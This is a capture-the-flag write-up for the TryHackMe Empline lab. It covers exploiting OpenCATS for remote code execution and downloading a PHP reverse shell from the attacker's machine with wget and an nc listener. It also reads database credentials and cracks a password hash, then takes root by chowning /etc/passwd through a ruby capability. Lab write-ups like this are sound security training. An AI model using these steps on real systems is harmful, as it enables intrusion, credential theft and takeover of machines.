# [TryHackMe:Empline](https://tryhackme.com/room/empline)

## Enumeration 

establish simple Nmap scan to discover open ports.

```bash
sudo nmap -T4 -Pn <target>
```

**Result**


![image](../../images/emp-1_clean.png)


Discovering website inside source-page I found this redirect link

![image](../../images/emp-2_clean.png)

So I edited my host file to add this subdomain.


```bash
sudo nano /etc/hosts
# Add subdomain
<target ip>  job.empline.thm
```

then go to this domain. 

![image](../../images/emp-3_clean.png)

Doing more content discovery for this website, I found this login page `job.empline.thm/` which disclose the version of used software 

![image](../../images/emp-4_clean.png)

use `searchsploit` tool to search for CVEs we found this one.

![image](../../images/emp-5_clean.png)

## Initial access

Using it gives us RCE inside the server.

![image](../../images/emp-6_clean.png)

## Upgrade our shell

This exploit spawn inside `/var/www/opencats/upload/careerportaladd` we can use `wget` to upload more stable shell like [pentest monkey](https://github.com/pentestmonkey/php-reverse-shell). 

First we need to transfer file to target machine, So I will establish python http server (there is several ways but in this situation this is the easiest way).

```bash
# attacking machine
python3 -m http.server <port>
# target machine
wget <attacking>:<port>/revShell.php
```

![image](../../images/emp-7_clean.png)

establish `nc` listener on my attacking machine

```bash
nc -lnvp <port>
```

then on target machine run the shell

```bash
php revShell.php
```

**Shell have been upgraded**

![image](../../images/emp-8_clean.png)

## Enumeration

Install [LinPEAS](https://linpeas.org/) inside target machine to enumeration, LinPEAS learn us the `config.php` file.
Inside it I found credentials for database, From `/etc/passwd` we can elicit that mysql is the used DB.

![image](../../images/emp-9_clean.png)

**Login to *mysql***

![image](../../images/emp-10_clean.png)

inside *mysql* CLI we can use this queries to reach hash for user George who is a user inside target machine.

![image](../../images/emp-11_clean.png)

**Cracking hash**

![image](../../images/emp-12_clean.png)

**Connection to user with SSH**

![image](../../images/emp-13_clean.png)

### User flag

![image](../../images/emp-14_clean.png)

## PrivilegeESC

With same *LinPEAS* scan it shows us this capability for *ruby* that allow us to change `/etc/passwd` owner to our current user.

![image](../../images/emp-15_clean.png)

Using this payload from [GTFObins](https://gtfobins.org/)

```bash
ruby -e 'File.chown(1002, 1002, "/etc/passwd")'
```

**Following the next steps** to add new user with admin privileges, but first we need to create password hash.

```bash
openssl passwd -1 <password> | xclip -selection clipboard
```

then follow this steps to add new root user.

![image](../../images/emp-16_clean.png)

### root flag

![image](../../images/emp-17_clean.png)
